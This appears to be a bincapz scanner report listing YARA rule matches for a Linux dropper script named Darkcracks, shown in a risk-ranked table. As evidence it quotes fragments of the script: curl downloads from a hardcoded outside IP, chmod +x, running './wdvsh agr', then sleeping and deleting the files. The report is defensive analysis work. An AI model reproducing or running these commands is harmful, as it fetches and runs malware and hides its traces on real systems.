## linux/2024.Darkcracks/darkcracks.sh [ðŸš¨ CRITICAL]

|   RISK   |                                                                   KEY                                                                   |                          DESCRIPTION                           |                                                                                                                                                                                                                                                                                                                                         EVIDENCE                                                                                                                                                                                                                                                                                                                                         |
|----------|-----------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| CRITICAL | [combo/dropper/shell](https://github.com/chainguard-dev/bincapz/blob/main/rules/combo/dropper/shell.yara#curl_chmod_relative_run_tiny)  | change dir, fetch file, make it executable, and run it         | [./agr](https://github.com/search?q=.%2Fagr&type=code)<br>[./wdvsh agr](https://github.com/search?q=.%2Fwdvsh+agr&type=code)<br>[cd /mnt](https://github.com/search?q=cd+%2Fmnt&type=code)<br>[cd /root](https://github.com/search?q=cd+%2Froot&type=code)<br>[cd /tmp](https://github.com/search?q=cd+%2Ftmp&type=code)<br>[cd /var/run](https://github.com/search?q=cd+%2Fvar%2Frun&type=code)<br>[chmod](https://github.com/search?q=chmod&type=code)<br>[curl http://179.191.68.85:82/vendor/sebastian/diff/src/Exception/j8UgL3v -o agr](https://github.com/search?q=curl+http%3A%2F%2F179.191.68.85%3A82%2Fvendor%2Fsebastian%2Fdiff%2Fsrc%2FException%2Fj8UgL3v+-o+agr&type=code) |
| CRITICAL | [evasion/run_sleep_delete](https://github.com/chainguard-dev/bincapz/blob/main/rules/evasion/run_sleep_delete.yara#run_sleep_delete)    | run executable, sleep, and delete                              | [./wdvsh agr](https://github.com/search?q=.%2Fwdvsh+agr&type=code)<br>[chmod +x ./wdvsh](https://github.com/search?q=chmod+%2Bx+.%2Fwdvsh&type=code)<br>[rm ./agr](https://github.com/search?q=rm+.%2Fagr&type=code)<br>[rm ./wdvsh](https://github.com/search?q=rm+.%2Fwdvsh&type=code)<br>[sleep 3](https://github.com/search?q=sleep+3&type=code)                                                                                                                                                                                                                                                                                                                                     |
| HIGH     | [process/chdir/unusual](https://github.com/chainguard-dev/bincapz/blob/main/rules/process/chdir-unusual.yara#unusual_cd_val)            | changes to an unusual system directory                         | [cd /mnt](https://github.com/search?q=cd+%2Fmnt&type=code)<br>[cd /root](https://github.com/search?q=cd+%2Froot&type=code)<br>[cd /tmp](https://github.com/search?q=cd+%2Ftmp&type=code)<br>[cd /var/run](https://github.com/search?q=cd+%2Fvar%2Frun&type=code)                                                                                                                                                                                                                                                                                                                                                                                                                         |
| HIGH     | [ref/ip_port](https://github.com/chainguard-dev/bincapz/blob/main/rules/ref/ip_port.yara#hardcoded_ip_port)                             | hardcoded IP:port destination                                  | [179.191.68.85:82](https://github.com/search?q=179.191.68.85%3A82&type=code)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| HIGH     | [ref/site/http/ip](https://github.com/chainguard-dev/bincapz/blob/main/rules/ref/site/http-ip.yara#http_hardcoded_ip)                   | hardcoded IP address within a URL                              | [http://179.191.68.85:82/vendor/sebastian/diff/src/Ex](http://179.191.68.85:82/vendor/sebastian/diff/src/Ex)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| MEDIUM   | [fs/file/make_executable](https://github.com/chainguard-dev/bincapz/blob/main/rules/fs/file-make_executable.yara#chmod_executable_plus) | makes file executable                                          | [chmod +x ./wdvsh](https://github.com/search?q=chmod+%2Bx+.%2Fwdvsh&type=code)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| MEDIUM   | [fs/permission/modify](https://github.com/chainguard-dev/bincapz/blob/main/rules/fs/permission-modify.yara#chmod)                       | [modifies file permissions](https://linux.die.net/man/1/chmod) | [chmod](https://github.com/search?q=chmod&type=code)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| MEDIUM   | [net/fetch](https://github.com/chainguard-dev/bincapz/blob/main/rules/net/fetch.yara#curl_value)                                        | Invokes curl                                                   | [curl "http://179.191.68.85:82/vendor/sebastian/diff/src/Exception/pQ1](https://github.com/search?q=curl+%22http%3A%2F%2F179.191.68.85%3A82%2Fvendor%2Fsebastian%2Fdiff%2Fsrc%2FException%2FpQ1&type=code)<br>[curl http://179.191.68.85:82/vendor/sebastian/diff/src/Exception/j8Ug](https://github.com/search?q=curl+http%3A%2F%2F179.191.68.85%3A82%2Fvendor%2Fsebastian%2Fdiff%2Fsrc%2FException%2Fj8Ug&type=code)                                                                                                                                                                                                                                                                   |
| MEDIUM   | [ref/ip](https://github.com/chainguard-dev/bincapz/blob/main/rules/ref/ip.yara#hardcoded_ip)                                            | hardcoded IP address                                           | [179.191.68.85](https://github.com/search?q=179.191.68.85&type=code)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| MEDIUM   | [ref/path/relative](https://github.com/chainguard-dev/bincapz/blob/main/rules/ref/path/relative.yara#relative_path_val)                 | references and possibly executes relative path                 | [./agr](https://github.com/search?q=.%2Fagr&type=code)<br>[./wdvsh](https://github.com/search?q=.%2Fwdvsh&type=code)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| MEDIUM   | [ref/path/root](https://github.com/chainguard-dev/bincapz/blob/main/rules/ref/path/root.yara#root_path_val)                             | path reference within /root                                    | [/root](https://github.com/search?q=%2Froot&type=code)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| MEDIUM   | [shell/exec](https://github.com/chainguard-dev/bincapz/blob/main/rules/shell/exec.yara#calls_shell)                                     | executes shell                                                 | [/bin/bash](https://github.com/search?q=%2Fbin%2Fbash&type=code)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| LOW      | [process/chdir](https://github.com/chainguard-dev/bincapz/blob/main/rules/process/chdir.yara#chdir_shell)                               | changes working directory                                      | [cd /mnt](https://github.com/search?q=cd+%2Fmnt&type=code)<br>[cd /root](https://github.com/search?q=cd+%2Froot&type=code)<br>[cd /tmp](https://github.com/search?q=cd+%2Ftmp&type=code)<br>[cd /var/run](https://github.com/search?q=cd+%2Fvar%2Frun&type=code)                                                                                                                                                                                                                                                                                                                                                                                                                         |
| LOW      | [ref/path/var](https://github.com/chainguard-dev/bincapz/blob/main/rules/ref/path/var.yara#var_path)                                    | path reference within /var                                     | [/var/run](https://github.com/search?q=%2Fvar%2Frun&type=code)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| LOW      | [ref/site/url](https://github.com/chainguard-dev/bincapz/blob/main/rules/ref/site/url.yara#http_url)                                    | contains embedded HTTP URLs                                    | [http://179.191.68.85](http://179.191.68.85)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |

